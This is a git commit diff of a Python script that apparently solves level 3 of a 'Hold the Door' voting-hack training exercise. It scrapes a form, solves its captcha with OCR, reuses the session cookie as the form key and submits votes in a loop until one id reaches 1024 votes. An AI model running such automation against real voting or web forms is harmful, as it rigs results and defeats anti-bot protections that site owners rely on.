72f9b80b3e80185444b9cd0dc3fe8d54d131cee6
Yago Martinez-Falero Hein <yagomfh@gmail.com>
2021-01-12 14:24:20 +0100

    feat: final solution

--- level_3/lvl3.py
+++ level_3/lvl3.py
@@ -1,44 +1,64 @@
 #!/usr/bin/python3
 import requests
+from bs4 import BeautifulSoup
+import pytesseract
+import urllib.request
+from PIL import Image
+from colorama import Fore, Back, Style
+
+URL = "http://158.69.76.135/level3.php"
+vote_id = "2483"
+session = requests.Session()
+goal = 1024
 
 def hack():
     headers = {
-        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-        'Accept-Encoding':'gzip, deflate',
-        'Accept-Language':'en-GB,en;q=0.9,fr;q=0.8,en-US;q=0.7,es;q=0.6',
-        'Cache-Control': 'max-age=0',
-        'Connection': 'keep-alive',
-        'Content-Length': '71',
-        'Content-Type': 'application/x-www-form-urlencoded',
-        'Cookie': '',
-        'Host': '158.69.76.135',
-        'Origin': 'http://158.69.76.135',
-        'Referer': 'http://158.69.76.135/level2.php',
-        'Upgrade-Insecure-Requests': '1',
+        'Referer': 'http://158.69.76.135/level3.php',
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
     }
 
     data = {
-        'id':'2483',
-        'holdthedoor':'Submit',
-        'key':''
+        'id': vote_id,
+        'key':'',
+        'captcha':'',
+        'holdthedoor':'Submit'
     }
 
-    URL = "http://158.69.76.135/level2.php"
-    response = requests.get(URL)
-    jar = response.cookies
-    cks = response.cookies['HoldTheDoor']
-    data['key'] = cks
-    full_cks = "PHPSESSID=knufqho189hue3dala10rdvp04; HoldTheDoor=" + cks
-    headers['Cookie'] = full_cks
-    page = requests.post(URL, data=data, headers=headers, cookies=jar)
-    print(page)
+    response = session.get(URL)
+    soup = BeautifulSoup(response.text, "html.parser")
+    image = session.get('http://158.69.76.135/captcha.php')
+
+    file = open("captcha.png", "wb")
+    file.write(image.content)
+    file.close()
+
+    captcha = pytesseract.image_to_string("captcha.png")
+    data['captcha'] = captcha[0:4]
+
+    dict = session.cookies.get_dict()
+    data['key'] = dict['HoldTheDoor']
+    
+    page = session.post(URL, data=data, headers=headers)
+
+    vote_nb = soup.select_one('tr:-soup-contains("2483")')
+    vote_nb = vote_nb.findAll('td')[1].text
+    vote_nb = int(vote_nb)
+
+    if page and "hacker" not in page.text:
+        print(Fore.GREEN + "Page hacked succesfully!")
+        session.cookies.clear()
+        return vote_nb
+    else:
+        print(Fore.RED + "Failed to hack the page...\n")
+        session.cookies.clear()
+        return -1
 
 def main():
-    for i in range(0, 1011):
-        hack()
-        print("Page hacked successfully!\nForm number: {}\n".format(i + 1))
-
+    res = 0
+    while res != goal:
+        res = hack() + 1
+        if res != 0:
+            print("Vote number: {}\n======".format(res))
 
 if __name__ == '__main__':
     main()
